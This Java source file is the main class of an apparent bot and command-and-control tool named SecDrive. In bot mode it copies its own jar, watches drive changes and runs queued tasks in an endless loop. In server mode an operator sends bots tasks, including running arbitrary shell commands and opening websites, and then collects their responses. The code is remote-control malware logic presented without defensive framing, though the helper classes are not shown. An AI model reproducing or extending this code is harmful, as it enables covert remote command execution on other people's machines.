package pl.kkogut;


public class SecDrive {

    public static void main(String[] args) {
        if(args.length>0){

            System.out.println("arg1 = " + args[0]);
            String param = args[0];
            if (param.equals("delete")) APIcaller.deleteAllCalls();
            else if (param.equals("bot")) {
                runBot();
            }
            else if (param.equals("server_send")){
                String type;
                String wwwAddress;
                String command;
                String message;
                if (args.length>1){
                    type = args[1];
                    if (type.equals("viewSite")){
                        if(args.length>2){
                            if(args[2].equals("default")){
                                wwwAddress = "https://www.myip.com/";
                            }
                            else{
                                wwwAddress = args[2];
                            }
                            Server.sendCommand(Task.TaskType.VIEW_SITE, wwwAddress);
                        }
                        else{
                            System.out.println("Please pass website address...");
                        }
                    }
                    else if (type.equals("cmdRun")){
                        if(args.length>2){
                            command = args[2];
                            Server.sendCommand(Task.TaskType.CMD_RUN, command);
                        }
                        else {
                            System.out.println("Please pass command to cmdRun...");
                        }
                    }
                    else if (type.equals("say")){
                        if(args.length>2){
                            message = args[2];
                            Server.sendCommand(Task.TaskType.HELLO, message);
                        }
                        else {
                            System.out.println("Please pass message...");
                        }

                    }
                    while(true){

                        Server.getAllResponses();
                    }
                }




            }
            else if(param.equals("server_responses")){
                while(true){

                    Server.getAllResponses();
                }
            }
        }
        else {

//            System.out.println("Please pass params: ");
//            System.out.println("bot");
//            System.out.println("server_send www.example.com");
//            System.out.println("server_responses");
        }

    }
    private static void runBot(){
        FilesOperator.copyJarFile();
        while (true) {
            FilesOperator.driveChanged();
            Tasks.proceedWithTasks();
        }
    }
}
